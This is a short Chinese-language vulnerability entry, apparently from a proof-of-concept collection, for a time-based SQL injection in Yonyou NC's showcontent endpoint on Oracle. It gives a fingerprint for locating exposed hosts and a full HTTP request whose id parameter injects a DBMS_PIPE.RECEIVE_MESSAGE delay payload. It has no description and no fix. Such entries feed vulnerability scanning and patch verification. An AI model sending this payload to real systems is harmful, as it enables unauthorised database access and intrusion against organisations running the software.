﻿# 用友 NC showcontent SQL注入漏洞-Oracle

> 更新时间：2024-04-30

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="UClient.dmg"

> 验证脚本：HTTP

```
GET /ebvp/infopub/showcontent?id=1'%20AND%203983=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(76)||CHR(108)||CHR(101),9)%20AND%20'Mgtn'='Mgtn HTTP/1.1
Accept-Encoding: identity
Connection: close
Content-Type: text/xml; charset=utf-8
SL-CE-SUID: 31

```

> 响应代码特征：999

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：用友 NC showcontent SQL注入漏洞-Oracle.poc

